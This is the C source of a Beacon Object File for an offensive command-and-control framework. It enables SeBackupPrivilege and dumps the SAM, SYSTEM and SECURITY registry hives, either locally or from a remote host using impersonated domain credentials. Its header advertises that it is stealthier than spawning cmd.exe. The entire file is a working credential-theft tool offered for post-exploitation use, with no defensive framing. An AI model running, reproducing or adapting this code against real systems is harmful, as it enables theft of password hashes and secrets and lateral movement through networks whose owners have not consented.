/*
 * BackupPrivilege BOF
 * -------------------
 * Dumps SAM, SYSTEM, and SECURITY hives via registry API.
 *
 * Supports TWO modes:
 *   LOCAL:  backupprivilege C:\savefolder
 *           Dumps LOCAL HKLM hives (no cmd.exe spawn, stealthier than reg save)
 *
 *   REMOTE: backupprivilege \\target C:\savefolder DOMAIN username password
 *           Dumps REMOTE hives via RegConnectRegistryW
 *
 * Requires SeBackupPrivilege.
 * Author: @lineeralgebra
 */

#include <stdio.h>
#include <windows.h>
#include "beacon.h"

/* ---- DFR Imports ---- */
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$LogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegConnectRegistryW(LPCWSTR lpMachineName, HKEY hKey, PHKEY phkResult);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegSaveKeyW(HKEY hKey, LPCWSTR lpFile, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);

/* RtlAdjustPrivilege - simple privilege enablement */
DECLSPEC_IMPORT LONG NTAPI NTDLL$RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN WasEnabled);

WINBASEAPI wchar_t * __cdecl MSVCRT$wcscat(wchar_t * destination, const wchar_t * source);
WINBASEAPI wchar_t * __cdecl MSVCRT$wcscpy(wchar_t * destination, const wchar_t * source);

/* Privilege constants */
#define SE_BACKUP_PRIVILEGE  17
#define SE_RESTORE_PRIVILEGE 18

/* ---- Make impersonation token ---- */
VOID MakeToken(LPCWSTR domain, LPCWSTR user, LPCWSTR password) {

    HANDLE token;

    if (ADVAPI32$LogonUserW(user, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "LogonUserW: %d", KERNEL32$GetLastError());
        return;
    }

    if (ADVAPI32$ImpersonateLoggedOnUser(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedOnUser: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(token);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonated user: %ls\\%ls", domain, user);
    return;
}

/* ---- Enable backup privileges ---- */
VOID EnableBackupPrivileges() {
    BOOLEAN wasEnabled;
    LONG status;

    status = NTDLL$RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &wasEnabled);
    if (status == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SeBackupPrivilege enabled");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable SeBackupPrivilege: 0x%08x", status);
    }

    status = NTDLL$RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &wasEnabled);
    if (status == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SeRestorePrivilege enabled");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] SeRestorePrivilege not available (non-fatal)");
    }
}

/* ---- Dump hives from a given HKLM handle ---- */
int DumpHives(HKEY hklm, const wchar_t * saveFolder, const wchar_t * label) {

    const wchar_t * hives[] = { L"SAM", L"SYSTEM", L"SECURITY" };
    HKEY   hkey;
    DWORD  result;
    int    successCount = 0;
    int    i;

    for (i = 0; i < 3; i++) {

        wchar_t tempSave[256] = {0};
        MSVCRT$wcscpy(tempSave, saveFolder);
        MSVCRT$wcscat(tempSave, L"\\");
        MSVCRT$wcscat(tempSave, hives[i]);

        if (label) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping %ls\\HKLM\\%ls -> %ls", label, hives[i], tempSave);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping HKLM\\%ls -> %ls", hives[i], tempSave);
        }

        result = ADVAPI32$RegOpenKeyExW(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
        if (result != 0) {
            if (result == 5) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] %ls - ACCESS_DENIED (error 5) - skipping", hives[i]);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExW (%ls): %d", hives[i], result);
            }
            continue;
        }

        /* Delete existing file if present (RegSaveKeyW fails if file already exists) */
        KERNEL32$DeleteFileW(tempSave);

        result = ADVAPI32$RegSaveKeyW(hkey, tempSave, NULL);
        if (result != 0) {
            if (result == 5) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] %ls - ACCESS_DENIED on save (error 5) - skipping", hives[i]);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "RegSaveKeyW (%ls): %d", hives[i], result);
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Saved %ls", tempSave);
            successCount++;
        }

        ADVAPI32$RegCloseKey(hkey);
    }

    return successCount;
}

/* ---- BOF entry point ---- */
void go(char *args, int alen) {

    datap parser;
    BeaconDataParse(&parser, args, alen);

    const wchar_t * arg1 = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * arg2 = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * arg3 = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * arg4 = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * arg5 = (wchar_t *) BeaconDataExtract(&parser, NULL);

    arg1 = (arg1 && *arg1) ? arg1 : NULL;
    arg2 = (arg2 && *arg2) ? arg2 : NULL;
    arg3 = (arg3 && *arg3) ? arg3 : NULL;
    arg4 = (arg4 && *arg4) ? arg4 : NULL;
    arg5 = (arg5 && *arg5) ? arg5 : NULL;

    if (arg1 == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Usage:");
        BeaconPrintf(CALLBACK_ERROR, "  LOCAL:  backupprivilege C:\\savefolder");
        BeaconPrintf(CALLBACK_ERROR, "  REMOTE: backupprivilege \\\\target C:\\savefolder DOMAIN user password");
        return;
    }

    /* Enable privileges first */
    EnableBackupPrivileges();

    /* Detect mode: if arg1 starts with \\, it's REMOTE mode */
    if (arg1[0] == L'\\' && arg1[1] == L'\\') {
        /* ========== REMOTE MODE ========== */
        const wchar_t * target     = arg1;
        const wchar_t * saveFolder = arg2;
        const wchar_t * domain     = arg3;
        const wchar_t * user       = arg4;
        const wchar_t * password   = arg5;

        if (saveFolder == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "REMOTE mode requires: backupprivilege \\\\target C:\\savefolder [DOMAIN user password]");
            return;
        }

        /* If credentials were supplied, create an impersonation token */
        if (domain && user && password) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Got credentials. Making token...");
            MakeToken(domain, user, password);
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] REMOTE MODE: dumping from %ls into '%ls'", target, saveFolder);

        HKEY hklm;
        DWORD result;

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Connecting to remote registry of '%ls'", target);
        result = ADVAPI32$RegConnectRegistryW(target, HKEY_LOCAL_MACHINE, &hklm);
        if (result != 0) {
            BeaconPrintf(CALLBACK_ERROR, "RegConnectRegistryW: %d", result);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] RegConnectRegistryW() - OK");

        int saved = DumpHives(hklm, saveFolder, target);
        ADVAPI32$RegCloseKey(hklm);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done. %d/3 hives dumped successfully.", saved);

    } else {
        /* ========== LOCAL MODE ========== */
        const wchar_t * saveFolder = arg1;

        BeaconPrintf(CALLBACK_OUTPUT, "[*] LOCAL MODE: dumping HKLM hives into '%ls'", saveFolder);

        int saved = DumpHives(HKEY_LOCAL_MACHINE, saveFolder, NULL);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done. %d/3 hives dumped successfully.", saved);
    }
}
